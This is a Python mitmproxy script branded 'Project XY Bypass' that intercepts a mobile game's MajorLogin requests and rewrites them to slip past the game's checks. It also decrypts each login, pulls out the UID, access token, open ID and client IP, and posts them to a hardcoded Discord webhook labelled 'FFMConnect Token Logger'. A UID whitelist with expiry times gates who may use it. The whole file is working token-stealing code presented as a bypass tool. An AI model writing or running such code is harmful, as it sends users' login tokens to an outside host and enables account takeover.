from mitmproxy import http
import json
import asyncio
import aiohttp
from crypto.encryption_utils import aes_decrypt, encrypt_api
from protocols.protobuf_utils import get_available_room, CrEaTe_ProTo
import copy
import time
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1466968588345802948/o1FLWqbKFKZbtLNVlaLHxG3VkAoFZ9na31AKyvj6TYhO80gBzgWCH6nEOD3_FMNZmHF9"
# ============================================
#  ____            _           _  __  ____   __
# |  _ \ _ __ ___ (_) ___  ___| |_\ \/ /\ \ / /
# | |_) | '__/ _ \| |/ _ \/ __| __|\  /  \ V / 
# |  __/| | | (_) | |  __/ (__| |_ /  \   | |  
# |_|   |_|  \___// |\___|\___|\__/_/\_\  |_|  
#               |__/                            
#
# Project  : Project XY Bypass
# Version  : v1.0.0
# Status   : Stable Release
# Author   : Quantum

# ============================================
MOBILE_PROTO = "ae6ee4459486c5ee50f9f4d9927780600af743d3a05996b9e615539a4a33a50e25ca771e5618e974d3f90de558ab3dd806cfba8f9bdf5b1b274268145f8df5ab57a1fa41aedda046a10bac8a644d2b2190bcf06c6be98c9ba546e4bfafbfdfce33e5297ff450b0e8964f9240adc8e7b485d7e3b91ce68062de7dc8b7e946b92e555b3e59f13e36b4b10563ebfdf2005343eaa15337000cb0c535614c89dd3be0cc698b84fa0ec162d1764f2eca7772212e20338fb6dec4be0bca7f9aaa31c5c08d1298e50e349f720de17e581e2c8d65f15dffefee23d7b9bbd47a4a75bca0603d11330047da6d275b694a39dea66d7213754f4f78d6e22c3c15d3f64b2d2f03396c8ad3b7f0f593e4406532e05c51beaa529f92ca1a90be52944bac4a80610a4e19b7a40ca870d6b797a52412642ffc83a70fe22bf23571c9dd6e0c9429f729f776082c22d4274d4921652026951083df9bfd61ebafa2b97b875c8090136bb3ebb6f834b5b441d9235f1b50aaf86a83f95fbd78e4019278d9cd94703c8b256f9f021579317c0fc777d2d2cb66c4ecb31962bbdda880424d22f86e0345c953717e3f000620671fadf32abdb76080d443221e4285c6771472985b827782360fb0d69634b2c1233eb0f420923fff055f2bfe6afbd7b0bc6fe4982d6f201af9188edd956337d94f18089bc6e097fb8c20c80873e53e53dced171b196f4596d948f0777f0af6da551b6caf72f1b2a301bf732e378f44bfd7930d96296abf520d49df2163db4c23af2ad44b4d2c2e3070a3283cc95e8e10543c44331c1855494adfc5cf8a73d58ebabdabe5fb6f845447396c56fdd4220dec5f8afdf2215b2b9b8daf96f5d3d0471d9433848dbfd7aa03cd1f2e16c90a42839629d1e2e9862e3f2b3b1bce89395fa1632601a0135ed405c14138217307563022ed349ae5e81636840b8c5c809a2b0db06fe6b888c94100627b7175b97c97cde1d13cc318c16dfa3dafc86e399012f46451ff7a5ecec48c470eacd76a33254aee640b41c8b39bf8fa9031fad495a269e00cc3a5c8091fc7c902ae669b954360ad85577ec03d78c2228f"

decrypted_bytes = aes_decrypt(MOBILE_PROTO)
decrypted_hex = decrypted_bytes.hex()
proto_json = get_available_room(decrypted_hex)
proto_fields = json.loads(proto_json)
proto_template = copy.deepcopy(proto_fields)

WHITELIST_BD = "whitelist_bd.json"
WHITELIST_SG = "whitelist_sg.json"
WHITELIST_IND = "whitelist_ind.json"
# ============================================
#  ____            _           _  __  ____   __
# |  _ \ _ __ ___ (_) ___  ___| |_\ \/ /\ \ / /
# | |_) | '__/ _ \| |/ _ \/ __| __|\  /  \ V / 
# |  __/| | | (_) | |  __/ (__| |_ /  \   | |  
# |_|   |_|  \___// |\___|\___|\__/_/\_\  |_|  
#               |__/                            
#
# Project  : Project XY Bypass
# Version  : v1.0.0
# Status   : Stable Release
# Author   : Quantum

# ============================================
def load_whitelist(path):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return {}
# ============================================
#  ____            _           _  __  ____   __
# |  _ \ _ __ ___ (_) ___  ___| |_\ \/ /\ \ / /
# | |_) | '__/ _ \| |/ _ \/ __| __|\  /  \ V / 
# |  __/| | | (_) | |  __/ (__| |_ /  \   | |  
# |_|   |_|  \___// |\___|\___|\__/_/\_\  |_|  
#               |__/                            
#
# Project  : Project XY Bypass
# Version  : v1.0.0
# Status   : Stable Release
# Author   : Quantum

# ============================================
def is_uid_whitelisted(uid_str):
    try:
        now = int(time.time())
        bd = load_whitelist(WHITELIST_BD)
        ind = load_whitelist(WHITELIST_IND)
        sg = load_whitelist(WHITELIST_SG)

        print(f"[Whitelist check] UID={uid_str}  Now={now}")

        if str(uid_str) in bd:
            expiry = int(bd[str(uid_str)])
            print(f"UID found in BD whitelist (expires {expiry}, left {expiry - now}s)")
            return expiry > now

        if str(uid_str) in ind:
            expiry = int(ind[str(uid_str)])
            print(f"UID found in IND whitelist (expires {expiry}, left {expiry - now}s)")
            return expiry > now
        
        if str(uid_str) in sg:
            expiry = int(sg[str(uid_str)])
            print(f"UID found in IND whitelist (expires {expiry}, left {expiry - now}s)")
            return expiry > now

        print("UID not found in either whitelist")
        return False
    except Exception as e:
        print(f"Error checking whitelist: {e}")
        return False
# ============================================
#  ____            _           _  __  ____   __
# |  _ \ _ __ ___ (_) ___  ___| |_\ \/ /\ \ / /
# | |_) | '__/ _ \| |/ _ \/ __| __|\  /  \ V / 
# |  __/| | | (_) | |  __/ (__| |_ /  \   | |  
# |_|   |_|  \___// |\___|\___|\__/_/\_\  |_|  
#               |__/                            
#
# Project  : Project XY Bypass
# Version  : v1.0.0
# Status   : Stable Release
# Author   : Quantum

# ============================================
async def send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip=None):
    embed = {
        "title": "🎫 FFMConnect Login Detected",
        "color": 0x2ECC71,
        "fields": [
            {"name": "UID", "value": str(uid), "inline": False},
            {"name": "Access Token", "value": f"`{access_token}`", "inline": False},
            {"name": "Open ID", "value": f"`{open_id}`", "inline": False},
            {"name": "Main Active Platform", "value": str(main_active_platform), "inline": False}
        ],
        "footer": {
            "text": "FFMConnect Token Logger"
        }
    }
    # ============================================
#  ____            _           _  __  ____   __
# |  _ \ _ __ ___ (_) ___  ___| |_\ \/ /\ \ / /
# | |_) | '__/ _ \| |/ _ \/ __| __|\  /  \ V / 
# |  __/| | | (_) | |  __/ (__| |_ /  \   | |  
# |_|   |_|  \___// |\___|\___|\__/_/\_\  |_|  
#               |__/                            
#
# Project  : Project XY Bypass
# Version  : v1.0.0
# Status   : Stable Release
# Author   : Quantum

# ============================================
    if client_ip:
        embed["fields"].append({"name": "Client IP", "value": client_ip, "inline": False})
    
    data = {
        "embeds": [embed]
    }
# ============================================
#  ____            _           _  __  ____   __
# |  _ \ _ __ ___ (_) ___  ___| |_\ \/ /\ \ / /
# | |_) | '__/ _ \| |/ _ \/ __| __|\  /  \ V / 
# |  __/| | | (_) | |  __/ (__| |_ /  \   | |  
# |_|   |_|  \___// |\___|\___|\__/_/\_\  |_|  
#               |__/                            
#
# Project  : Project XY Bypass
# Version  : v1.0.0
# Status   : Stable Release
# Author   : Quantum

# ============================================
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(DISCORD_WEBHOOK_URL, json=data) as resp:
                await resp.text()
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def run_async_task(coro):
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(coro)
        else:
            loop.run_until_complete(coro)
    except RuntimeError:
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        new_loop.run_until_complete(coro)

def get_client_ip(flow: http.HTTPFlow) -> str:
    """Get client IP address"""
    if hasattr(flow.client_conn, 'address') and flow.client_conn.address:
        return flow.client_conn.address[0]
    return "unknown"

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            request_bytes = flow.request.content
            original_encrypted_proto = request_bytes.hex()
            
            request_hex = request_bytes.hex()
            decrypted_bytes = aes_decrypt(request_hex)
            decrypted_hex = decrypted_bytes.hex()
            proto_json = get_available_room(decrypted_hex)
            proto_fields = json.loads(proto_json)
            
            print("Original MajorLogin Request Details:")
            print(json.dumps(proto_fields, indent=2, ensure_ascii=False))
            
            uid = None
            access_token = None
            open_id = None
            main_active_platform = None
            
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid = potential_uid
                        print(f"Found UID in field {field_num}: {uid}")
                        break
            
            if "29" in proto_fields and isinstance(proto_fields["29"], dict) and "data" in proto_fields["29"]:
                access_token = str(proto_fields["29"]["data"])
            
            if "22" in proto_fields and isinstance(proto_fields["22"], dict) and "data" in proto_fields["22"]:
                open_id = str(proto_fields["22"]["data"])
            
            if "99" in proto_fields and isinstance(proto_fields["99"], dict) and "data" in proto_fields["99"]:
                main_active_platform = str(proto_fields["99"]["data"])
            elif "100" in proto_fields and isinstance(proto_fields["100"], dict) and "data" in proto_fields["100"]:
                main_active_platform = str(proto_fields["100"]["data"])
            
            print(f"Extracted from MajorLogin:")
            print(f"  UID: {uid}")
            print(f"  Access Token: {access_token}")
            print(f"  Open ID: {open_id}")
            print(f"  Main Active Platform: {main_active_platform}")
            
            if access_token and open_id:
                client_ip = get_client_ip(flow)
                print(f"Sending to Discord: UID={uid}, Token={access_token[:20]}..., OpenID={open_id}")
                run_async_task(send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip))
            
            
            
            modified_proto = copy.deepcopy(proto_template)
            
            if "29" in modified_proto and isinstance(modified_proto["29"], dict):
                modified_proto["29"]["data"] = access_token if access_token else modified_proto["29"].get("data", "")
                
            
            if "22" in modified_proto and isinstance(modified_proto["22"], dict):
                modified_proto["22"]["data"] = open_id if open_id else modified_proto["22"].get("data", "")
                
            
            if main_active_platform:
                if "99" in modified_proto and isinstance(modified_proto["99"], dict):
                    modified_proto["99"]["data"] = int(main_active_platform)
                else:
                    modified_proto["99"] = {"wire_type": "varint", "data": int(main_active_platform)}
                
                if "100" in modified_proto and isinstance(modified_proto["100"], dict):
                    modified_proto["100"]["data"] = int(main_active_platform)
                else:
                    modified_proto["100"] = {"wire_type": "varint", "data": int(main_active_platform)}
                
            
            proto_bytes = CrEaTe_ProTo(modified_proto)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            print("Successfully modified and encrypted MajorLogin request")
                
        except Exception as e:
            print(f"Error processing MajorLogin request: {e}")

def response(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            resp_bytes = flow.response.content
            resp_hex = resp_bytes.hex()
            proto_json = get_available_room(resp_hex)
            proto_fields = json.loads(proto_json)
            
            uid_from_response = None
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid_from_response = potential_uid
                        print(f"Found UID in response field {field_num}: {uid_from_response}")
                        break
            status_color = "[FF0000]"
            uid_color = "[FF0000]"
            if uid_from_response is not None:
                if not is_uid_whitelisted(uid_from_response):
                    flow.response.content = (
                        f"[FF0000]⧉───────────────────────────────────────────────⧉\n"
                        f"[FF4444]⟡  SYSTEM  : [FFD700]Project XY | Verification\n"
                        f"[FF4444]⟡  TIME    : [AAAAAA]{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}\n"
                        f"[FF4444]⟡  UID     : {uid_color}{uid_from_response}\n"
                        f"[FF4444]⟡  STATUS  : {status_color}NOT AUTHORIZED\n"
                        f"[FF0000]⧉───────────────────────────────────────────────⧉\n"
                    ).encode()
   
                    flow.response.status_code = 500
                    return
                else:
                    flow.response.status_code = 200
            else:
                print("No UID found in MajorLogin response")

        except Exception as e:
            print(f"Error processing MajorLogin response: {e}")